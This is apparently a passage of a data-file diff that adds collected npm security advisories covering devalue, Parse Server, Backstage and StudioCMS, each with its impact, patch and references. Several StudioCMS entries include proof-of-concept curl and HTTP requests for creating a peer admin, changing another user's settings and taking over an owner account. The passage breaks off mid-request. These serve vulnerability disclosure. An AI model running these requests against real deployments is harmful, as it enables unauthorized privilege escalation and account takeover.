+          "date_published": "2026-03-12T17:29:30.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-qmpg-8xg6-ph5q"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "43056b5aa562872edbe3008b4be0fc97",
+        "url": "https://github.com/advisories/GHSA-mwv9-gp5h-frr4",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[devalue] Sveltejs devalue's `devalue.parse` and `devalue.unflatten` emit objects with `__proto__` own properties",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:10:09Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-mwv9-gp5h-frr4"
+          ],
+          "content_hash": "sha256:77d341978c4d50ea129bb94eaf8e5b8209fd301a40f168fe608129dde4ee805e"
+        },
+        "source_payload": {
+          "content_html": "<p>In some circumstances, <code>devalue.parse</code> and <code>devalue.unflatten</code> could emit objects with <code>__proto__</code> own properties. This in and of itself is not a security vulnerability (and is possible with, for example, <code>JSON.parse</code> as well), but it can result in prototype injection if <em>downstream</em> code handles it incorrectly:</p>\n<pre><code class=\"language-ts\">const result = devalue.parse(/* input creating an object with a __proto__ property */);\nconst target = {};\nObject.assign(target, result); // target's prototype is now polluted\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/sveltejs/devalue/security/advisories/GHSA-mwv9-gp5h-frr4\">https://github.com/sveltejs/devalue/security/advisories/GHSA-mwv9-gp5h-frr4</a></li>\n<li><a href=\"https://github.com/sveltejs/devalue/releases/tag/v5.6.4\">https://github.com/sveltejs/devalue/releases/tag/v5.6.4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mwv9-gp5h-frr4\">https://github.com/advisories/GHSA-mwv9-gp5h-frr4</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T16:38:15.000Z",
+          "date_published": "2026-03-12T16:38:15.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-mwv9-gp5h-frr4"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "79da0301b75e938c985bb003962b2436",
+        "url": "https://github.com/advisories/GHSA-c442-97qw-j6c6",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[parse-server] Parse Server has a SQL injection via query field name when using PostgreSQL",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:10:09Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-c442-97qw-j6c6"
+          ],
+          "content_hash": "sha256:fd9df7d01ec93b5bba9e064789dd2aa793e7863e4c6f9b46ee104ef438bef79e"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An attacker with access to the master key can inject malicious SQL via crafted field names used in query constraints when Parse Server is configured with PostgreSQL as the database. The field name in a <code>$regex</code> query operator is passed to PostgreSQL using unparameterized string interpolation, allowing the attacker to manipulate the SQL query. While the master key controls what can be done through the Parse Server abstraction layer, this SQL injection bypasses Parse Server entirely and operates at the database level.</p>\n<p>This vulnerability only affects Parse Server deployments using PostgreSQL.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The fix applies proper SQL identifier escaping to field names in the query handler and hardens query field name validation to reject malicious field names for all query types.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There is no known workaround.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>GitHub security advisory: <a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-c442-97qw-j6c6\">https://github.com/parse-community/parse-server/security/advisories/GHSA-c442-97qw-j6c6</a></li>\n<li>Fix Parse Server 9: <a href=\"https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.10\">https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.10</a></li>\n<li>Fix Parse Server 8: <a href=\"https://github.com/parse-community/parse-server/releases/tag/8.6.36\">https://github.com/parse-community/parse-server/releases/tag/8.6.36</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-c442-97qw-j6c6\">https://github.com/parse-community/parse-server/security/advisories/GHSA-c442-97qw-j6c6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-32234\">https://nvd.nist.gov/vuln/detail/CVE-2026-32234</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/8.6.36\">https://github.com/parse-community/parse-server/releases/tag/8.6.36</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.10\">https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.10</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c442-97qw-j6c6\">https://github.com/advisories/GHSA-c442-97qw-j6c6</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T16:37:59.000Z",
+          "date_published": "2026-03-12T16:37:58.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-c442-97qw-j6c6"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "79da0301b75e938c985bb003962b2436",
+        "url": "https://github.com/advisories/GHSA-c442-97qw-j6c6",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[parse-server] Parse Server has a SQL injection via query field name when using PostgreSQL",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:10:09Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-c442-97qw-j6c6"
+          ],
+          "content_hash": "sha256:fd9df7d01ec93b5bba9e064789dd2aa793e7863e4c6f9b46ee104ef438bef79e"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An attacker with access to the master key can inject malicious SQL via crafted field names used in query constraints when Parse Server is configured with PostgreSQL as the database. The field name in a <code>$regex</code> query operator is passed to PostgreSQL using unparameterized string interpolation, allowing the attacker to manipulate the SQL query. While the master key controls what can be done through the Parse Server abstraction layer, this SQL injection bypasses Parse Server entirely and operates at the database level.</p>\n<p>This vulnerability only affects Parse Server deployments using PostgreSQL.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The fix applies proper SQL identifier escaping to field names in the query handler and hardens query field name validation to reject malicious field names for all query types.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There is no known workaround.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>GitHub security advisory: <a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-c442-97qw-j6c6\">https://github.com/parse-community/parse-server/security/advisories/GHSA-c442-97qw-j6c6</a></li>\n<li>Fix Parse Server 9: <a href=\"https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.10\">https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.10</a></li>\n<li>Fix Parse Server 8: <a href=\"https://github.com/parse-community/parse-server/releases/tag/8.6.36\">https://github.com/parse-community/parse-server/releases/tag/8.6.36</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-c442-97qw-j6c6\">https://github.com/parse-community/parse-server/security/advisories/GHSA-c442-97qw-j6c6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-32234\">https://nvd.nist.gov/vuln/detail/CVE-2026-32234</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/8.6.36\">https://github.com/parse-community/parse-server/releases/tag/8.6.36</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.10\">https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.10</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c442-97qw-j6c6\">https://github.com/advisories/GHSA-c442-97qw-j6c6</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T16:37:59.000Z",
+          "date_published": "2026-03-12T16:37:58.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-c442-97qw-j6c6"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "670fa7c7ca9c07571caaa2d8758e584d",
+        "url": "https://github.com/advisories/GHSA-8wq8-6859-qx77",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[@backstage/plugin-scaffolder-backend] @backstage/plugin-scaffolder-backend: Possible exposure of defaultEnvironment secrets using dry-run endpoint",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:10:09Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-8wq8-6859-qx77"
+          ],
+          "content_hash": "sha256:0ba3aa0394373606706c88ba03a6973d92c6bae790125b3db6c9082d4120833a"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>  Authenticated users with permission to execute scaffolder dry-runs can gain access to server-configured environment secrets through the dry-run API response. Secrets are properly \n  redacted in log output but not in all parts of the response payload.</p>\n<p>  Deployments that have configured <code>scaffolder.defaultEnvironment.secrets</code> are affected.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>  This is patched in <code>@backstage/plugin-scaffolder-backend</code> version 3.1.5</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>  Remove or empty the <code>scaffolder.defaultEnvironment.secrets</code> configuration from <code>app-config.yaml</code>. Alternatively, restrict access to the scaffolder dry-run functionality via the\n  permissions framework.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://backstage.io/docs/features/software-templates/\">Backstage Scaffolder Backend documentation</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/backstage/backstage/security/advisories/GHSA-8wq8-6859-qx77\">https://github.com/backstage/backstage/security/advisories/GHSA-8wq8-6859-qx77</a></li>\n<li><a href=\"https://github.com/backstage/backstage/commit/3b62dd2d6bf7623ebd23e4b5a6dceb209f98dfce\">https://github.com/backstage/backstage/commit/3b62dd2d6bf7623ebd23e4b5a6dceb209f98dfce</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8wq8-6859-qx77\">https://github.com/advisories/GHSA-8wq8-6859-qx77</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T14:51:08.000Z",
+          "date_published": "2026-03-12T14:51:06.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-8wq8-6859-qx77"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "e62e309990d2b0a645c8f9ca024908f5",
+        "url": "https://github.com/advisories/GHSA-qp4c-xg64-7c6x",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[@backstage/plugin-auth-backend] @backstage/plugin-auth-backend: SSRF in experimental CIMD metadata fetch",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:10:09Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-qp4c-xg64-7c6x"
+          ],
+          "content_hash": "sha256:e3027c15a3ac2a29515152b5d425505c415a3f4c22d00ffe3f4028cdbcaffe4c"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>  A Server-Side Request Forgery (SSRF) vulnerability exists in <code>@backstage/plugin-auth-backend</code> when <code>auth.experimentalClientIdMetadataDocuments.enabled</code> is set to <code>true</code>. The CIMD \n  metadata fetch validates the initial <code>client_id</code> hostname against private IP ranges but does not apply the same validation after HTTP redirects.</p>\n<p>  The practical impact is limited. The attacker cannot read the response body from the internal request, cannot control request headers or method, and the feature must be explicitly\n   enabled via an experimental flag that is off by default. Deployments that restrict <code>allowedClientIdPatterns</code> to specific trusted domains are not affected.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>  Patched in <code>@backstage/plugin-auth-backend</code> version <code>0.27.1</code>. The fix disables HTTP redirect following when fetching CIMD metadata documents.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>  Disable the experimental CIMD feature by removing or setting <code>auth.experimentalClientIdMetadataDocuments.enabled</code> to <code>false</code> in your app-config. This is the default configuration.\n   Alternatively, restrict <code>allowedClientIdPatterns</code> to specific trusted domains rather than using the default wildcard pattern.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://datatracker.ietf.org/doc/draft-ietf-oauth-client-id-metadata-document/\">IETF Client ID Metadata Document draft</a></li>\n<li><a href=\"https://modelcontextprotocol.io/specification/2025-11-25/basic/authorization#client-id-metadata-documents\">MCP Authorization Specification - Client ID Metadata Documents</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/backstage/backstage/security/advisories/GHSA-qp4c-xg64-7c6x\">https://github.com/backstage/backstage/security/advisories/GHSA-qp4c-xg64-7c6x</a></li>\n<li><a href=\"https://github.com/backstage/backstage/commit/17038abf2dfdb4abc08a59b1c95af39851de0e07\">https://github.com/backstage/backstage/commit/17038abf2dfdb4abc08a59b1c95af39851de0e07</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qp4c-xg64-7c6x\">https://github.com/advisories/GHSA-qp4c-xg64-7c6x</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T14:51:03.000Z",
+          "date_published": "2026-03-12T14:51:02.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-qp4c-xg64-7c6x"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "9d094a94180137079c2f758741e2e9ec",
+        "url": "https://github.com/advisories/GHSA-wqvh-63mv-9w92",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[@backstage/plugin-auth-backend] @backstage/plugin-auth-backend: OAuth redirect URI allowlist bypass",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:10:09Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-wqvh-63mv-9w92"
+          ],
+          "content_hash": "sha256:a8e8667abf4f94eecef438131fdc50cfd86c17b3f124c928ea94cefed3fb1e9f"
+        },
+        "signals": {
+          "severity": {
+            "level": "low",
+            "source": "keyword",
+            "provenance": {
+              "method": "keyword_scan",
+              "authority": "npm Security Advisories",
+              "authority_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
+              "evidence_url": "https://github.com/advisories/GHSA-wqvh-63mv-9w92"
+            }
+          }
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The experimental OIDC provider in <code>@backstage/plugin-auth-backend</code> is vulnerable to a redirect URI allowlist bypass. Instances that have enabled experimental Dynamic Client Registration or Client ID Metadata Documents and configured <code>allowedRedirectUriPatterns</code> are affected.</p>\n<p>A specially crafted redirect URI can pass the allowlist validation while resolving to an attacker-controlled host. If a victim approves the resulting OAuth consent request, their authorization code is sent to the attacker, who can exchange it for a valid access token.</p>\n<p>This requires victim interaction and that one of the experimental features is explicitly enabled, which is not the default.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to <code>@backstage/plugin-auth-backend</code> version 0.27.1 or later.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Disable experimental Dynamic Client Registration and Client ID Metadata Documents features if they are not required.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc6749#section-3.1.2\">RFC 6749 Section 3.1.2 - Redirection Endpoint</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/backstage/backstage/security/advisories/GHSA-wqvh-63mv-9w92\">https://github.com/backstage/backstage/security/advisories/GHSA-wqvh-63mv-9w92</a></li>\n<li><a href=\"https://github.com/backstage/backstage/commit/6042dd0c7f0706e0f473dafa92799ecf19c825ec\">https://github.com/backstage/backstage/commit/6042dd0c7f0706e0f473dafa92799ecf19c825ec</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wqvh-63mv-9w92\">https://github.com/advisories/GHSA-wqvh-63mv-9w92</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T14:50:59.000Z",
+          "date_published": "2026-03-12T14:50:59.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-wqvh-63mv-9w92"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "3c68f277b360804fe3d326544008af34",
+        "url": "https://github.com/advisories/GHSA-wj56-g96r-673q",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[studiocms] StudioCMS: REST API Missing Rank Check Allows Admin to Create Peer Admin Accounts",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:10:09Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-wj56-g96r-673q"
+          ],
+          "content_hash": "sha256:b66ae831a0a26f1994d75d67a2c776484647c26aa5bb7978b2c870c8852ef7ad"
+        },
+        "signals": {
+          "severity": {
+            "level": "low",
+            "source": "keyword",
+            "provenance": {
+              "method": "keyword_scan",
+              "authority": "npm Security Advisories",
+              "authority_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
+              "evidence_url": "https://github.com/advisories/GHSA-wj56-g96r-673q"
+            }
+          }
+        },
+        "source_payload": {
+          "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>The REST API <code>createUser</code> endpoint uses string-based rank checks that only block creating <code>owner</code> accounts, while the Dashboard API uses <code>indexOf</code>-based rank comparison that prevents creating users at or above your own rank. This inconsistency allows an admin to create additional admin accounts via the REST API, enabling privilege proliferation and persistence.</p>\n<h2 id=\"details\">Details</h2>\n<p>The REST API handler in <code>packages/studiocms/frontend/pages/studiocms_api/_handlers/rest-api/v1/secure.ts:1365-1378</code>:</p>\n<pre><code class=\"language-typescript\">// REST API — only blocks creating 'owner'\nif (newUserRank === 'owner' &amp;&amp; rank !== 'owner') {\n    return yield* new RestAPIError({\n        error: 'Unauthorized to create user with owner rank',\n    });\n}\n\nif (rank === 'admin' &amp;&amp; newUserRank === 'owner') {\n    return yield* new RestAPIError({\n        error: 'Unauthorized to create user with owner rank',\n    });\n}\n\n// Missing: no check preventing admin from creating admin\n// newUserRank='admin' passes all checks\n</code></pre>\n<p>The Dashboard API handler in <code>_handlers/dashboard/create.ts</code> uses the correct approach:</p>\n<pre><code class=\"language-typescript\">// Dashboard API — blocks creating users at or above own rank\nconst callerPerm = availablePermissionRanks.indexOf(userData.permissionLevel);\nconst targetPerm = availablePermissionRanks.indexOf(rank);\n\nif (targetPerm &gt;= callerPerm) {\n    return yield* new DashboardAPIError({\n        error: 'Unauthorized: insufficient permissions to assign target rank',\n    });\n}\n</code></pre>\n<p>With <code>availablePermissionRanks = ['unknown', 'visitor', 'editor', 'admin', 'owner']</code>:</p>\n<ul>\n<li>Admin (index 3) creating admin (index 3): <code>3 &gt;= 3</code> = blocked in Dashboard</li>\n<li>In REST API: no such check — allowed</li>\n</ul>\n<h2 id=\"poc\">PoC</h2>\n<pre><code class=\"language-bash\"># 1. Use an admin-level API token\n\n# 2. Create a new admin user via REST API\ncurl -X POST 'http://localhost:4321/studiocms_api/rest/v1/secure/users' \\\n  -H 'Authorization: Bearer &lt;admin-api-token&gt;' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n    \"username\": \"rogue_admin\",\n    \"email\": \"rogue@attacker.com\",\n    \"displayname\": \"Rogue Admin\",\n    \"rank\": \"admin\",\n    \"password\": \"StrongP@ssw0rd123\"\n  }'\n\n# Expected: 403 Forbidden (admin should not create peer admin accounts)\n# Actual: 200 with new admin user created\n</code></pre>\n<h2 id=\"impact\">Impact</h2>\n<ul>\n<li>A compromised or rogue admin can create additional admin accounts as persistence mechanisms that survive password resets or token revocations</li>\n<li>Inconsistent security model between Dashboard API and REST API creates confusion about intended authorization boundaries</li>\n<li>Note: requires admin access (PR:H), which limits practical severity</li>\n</ul>\n<h2 id=\"recommended-fix\">Recommended Fix</h2>\n<p>Replace string-based checks with <code>indexOf</code> comparison in <code>packages/studiocms/frontend/pages/studiocms_api/_handlers/rest-api/v1/secure.ts</code>:</p>\n<pre><code class=\"language-typescript\">// Before:\nif (newUserRank === 'owner' &amp;&amp; rank !== 'owner') { ... }\nif (rank === 'admin' &amp;&amp; newUserRank === 'owner') { ... }\n\n// After:\nconst availablePermissionRanks = ['unknown', 'visitor', 'editor', 'admin', 'owner'];\nconst callerPerm = availablePermissionRanks.indexOf(rank);\nconst targetPerm = availablePermissionRanks.indexOf(newUserRank);\n\nif (targetPerm &gt;= callerPerm) {\n    return yield* new RestAPIError({\n        error: 'Unauthorized: insufficient permissions to assign target rank',\n    });\n}\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/withstudiocms/studiocms/security/advisories/GHSA-wj56-g96r-673q\">https://github.com/withstudiocms/studiocms/security/advisories/GHSA-wj56-g96r-673q</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-32106\">https://nvd.nist.gov/vuln/detail/CVE-2026-32106</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wj56-g96r-673q\">https://github.com/advisories/GHSA-wj56-g96r-673q</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T14:49:49.000Z",
+          "date_published": "2026-03-12T14:49:48.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-wj56-g96r-673q"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "25baf30dbb7f0625533625c01b920a21",
+        "url": "https://github.com/advisories/GHSA-9v82-xrm4-mp52",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[studiocms] StudioCMS: IDOR in User Notification Preferences Allows Any Authenticated User to Modify Any User's Settings",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:10:09Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-9v82-xrm4-mp52"
+          ],
+          "content_hash": "sha256:032f3a176fff80d64eda2dbdf855d032f703e3e1ade540d7704ab68cc07c56c4"
+        },
+        "signals": {
+          "severity": {
+            "level": "low",
+            "source": "keyword",
+            "provenance": {
+              "method": "keyword_scan",
+              "authority": "npm Security Advisories",
+              "authority_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
+              "evidence_url": "https://github.com/advisories/GHSA-9v82-xrm4-mp52"
+            }
+          }
+        },
+        "source_payload": {
+          "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>The <code>updateUserNotifications</code> endpoint accepts a user ID from the request payload and uses it to update that user's notification preferences. It checks that the caller is logged in but never verifies that the caller owns the target account (<code>id !== userData.user.id</code>). Any authenticated visitor can modify notification preferences for any user, including disabling admin notifications to suppress detection of malicious activity.</p>\n<h2 id=\"details\">Details</h2>\n<p>The vulnerable handler is in <code>packages/studiocms/frontend/pages/studiocms_api/_handlers/dashboard/users.ts:257-311</code>:</p>\n<pre><code class=\"language-typescript\">.handle(\n    'updateUserNotifications',\n    Effect.fn(function* ({ payload: { id, notifications } }) {\n        // ...demo mode checks...\n\n        const [sdk, userData] = yield* Effect.all([SDKCore, CurrentUser]);\n\n        // Line 274: Only checks login + visitor level — any authenticated user passes\n        if (!userData.isLoggedIn || !userData.userPermissionLevel.isVisitor) {\n            return yield* new DashboardAPIError({ error: 'Unauthorized' });\n        }\n\n        // Line 280: Uses 'id' from payload — NOT userData.user.id\n        const existingUser = yield* sdk.GET.users.byId(id);\n\n        // Line 288: Updates target user using attacker-controlled 'id'\n        const updatedData = yield* sdk.AUTH.user.update({\n            userId: id,       // ← attacker controls this\n            userData: {\n                id,            // ← attacker controls this\n                name: existingUser.name,\n                username: existingUser.username,\n                updatedAt: new Date().toISOString(),\n                emailVerified: existingUser.emailVerified,\n                createdAt: undefined,\n                notifications,  // ← attacker controls this\n            },\n        });\n    })\n)\n</code></pre>\n<p>For comparison, the <code>updateUserProfile</code> handler in <code>dashboard/profile.ts</code> correctly uses <code>userData.user.id</code> instead of a user-supplied ID, preventing IDOR.</p>\n<h2 id=\"poc\">PoC</h2>\n<pre><code class=\"language-bash\"># 1. Log in as a visitor-role user, obtain session cookie\n\n# 2. Disable all notifications for the admin user\ncurl -X POST 'http://localhost:4321/studiocms_api/dashboard/update-user-notifications' \\\n  -H 'Cookie: studiocms-session=&lt;visitor-session-token&gt;' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n    \"id\": \"&lt;admin-user-id&gt;\",\n    \"notifications\": \"\"\n  }'\n\n# Expected: 403 Forbidden\n# Actual: 200 {\"message\":\"User notifications updated successfully\"}\n</code></pre>\n<h2 id=\"impact\">Impact</h2>\n<ul>\n<li>Any authenticated visitor can disable notification preferences for admin/owner accounts, suppressing alerts about new user creation, account changes, and user deletions</li>\n<li>Enables attack chaining — suppress admin notifications first, then perform other malicious actions with reduced detection risk</li>\n<li>Can modify any user's notification preferences (enable unwanted notifications or disable critical ones)</li>\n</ul>\n<h2 id=\"recommended-fix\">Recommended Fix</h2>\n<p>Add an ownership check in <code>packages/studiocms/frontend/pages/studiocms_api/_handlers/dashboard/users.ts</code>:</p>\n<pre><code class=\"language-typescript\">// After the login check at line 274, add:\nif (id !== userData.user?.id &amp;&amp; !userData.userPermissionLevel.isAdmin) {\n    return yield* new DashboardAPIError({\n        error: 'Unauthorized: cannot modify another user\\'s notification preferences',\n    });\n}\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/withstudiocms/studiocms/security/advisories/GHSA-9v82-xrm4-mp52\">https://github.com/withstudiocms/studiocms/security/advisories/GHSA-9v82-xrm4-mp52</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-32104\">https://nvd.nist.gov/vuln/detail/CVE-2026-32104</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9v82-xrm4-mp52\">https://github.com/advisories/GHSA-9v82-xrm4-mp52</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T14:49:43.000Z",
+          "date_published": "2026-03-12T14:49:41.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-9v82-xrm4-mp52"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "12bfcc8b918e698a53665b71526a9721",
+        "url": "https://github.com/advisories/GHSA-h7vr-cg25-jf8c",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[studiocms] StudioCMS: IDOR — Admin-to-Owner Account Takeover via Password Reset Link Generation",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:10:09Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-h7vr-cg25-jf8c"
+          ],
+          "content_hash": "sha256:ca4fd1e932db2b1075f09f0f46aeeafb3516c9fef5f87326b019a830a7141987"
+        },
+        "source_payload": {
+          "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>The POST /studiocms_api/dashboard/create-reset-link endpoint allows any authenticated user with admin privileges to generate a password reset token for any other user, including the owner account. The handler verifies that the caller is an admin but does not enforce role hierarchy, nor does it validate that the target userId matches the caller's identity. Combined with the POST /studiocms_api/dashboard/reset-password endpoint, this allows a complete account takeover of the highest-privileged account in the system.</p>\n<h2 id=\"details\">Details</h2>\n<h4 id=\"vulnerable-code\">Vulnerable Code</h4>\n<p><strong>File:</strong> packages/studiocms/frontend/pages/studiocms_api/dashboard/create-reset-link.ts\n<strong>Version:</strong> <a href=\"mailto:studiocms@0.3.0\">studiocms@0.3.0</a></p>\n<pre><code>const isAuthorized = ctx.locals.StudioCMS.security?.userPermissionLevel.isAdmin;  // [1]\nif (!isAuthorized) {\n    return apiResponseLogger(403, 'Unauthorized');\n}\n\nconst { userId } = yield* readAPIContextJson&lt;{ userId: string }&gt;(ctx);            // [2]\n\nif (!userId) {\n    return apiResponseLogger(400, 'Invalid form data, userId is required');\n}\n\n// [3] userId is passed directly — no check against caller's identity\n// [4] No check whether the target user outranks the caller\nconst token = yield* sdk.resetTokenBucket.new(userId);                            // [5]\n</code></pre>\n<h4 id=\"analysis\">Analysis</h4>\n<p>Unlike the API token endpoints (which only require isEditor), this handler correctly gates access at the isAdmin level [1]. However, two critical authorization checks are still missing:</p>\n<ol>\n<li><strong>No caller identity validation [2][3]:</strong> The userId from the JSON payload is never compared against the authenticated caller's session identity. An admin can specify any user's UUID, including the owner's.</li>\n<li><strong>No role hierarchy enforcement [4]:</strong> The handler does not verify whether the target user has a higher privilege level than the caller. An admin can target the owner account, which is the only account that should be immune to administrative actions from lower-ranked admins.</li>\n<li><strong>Reset token returned in response [5]:</strong> The generated reset token (a signed JWT) is returned directly in the HTTP response body. This token can then be used with the reset-password endpoint to set an arbitrary password for the target account, completing the account takeover chain.</li>\n</ol>\n<p>The core issue is that password reset generation is treated as a generic admin operation rather than a self-service operation with explicit scope restrictions.</p>\n<h2 id=\"poc\">PoC</h2>\n<p><strong>Environment</strong>\n<em>User ID | Role</em>\n2450bf33-0135-4142-80be-9854f9a5e9f1 | owner\neacee42e-ae7e-4e9e-945b-68e26696ece4 | admin</p>\n<p><strong>Step 1 — Verify Attacker's Session (Admin)</strong>\nConfirm the attacker is authenticated as admin (user dummy03):</p>\n<pre><code>POST /studiocms_api/dashboard/verify-session HTTP/1.1\nHost: 127.0.0.1:4321\nCookie: auth_session=&lt;admin_session_cookie&gt;\nContent-Type: 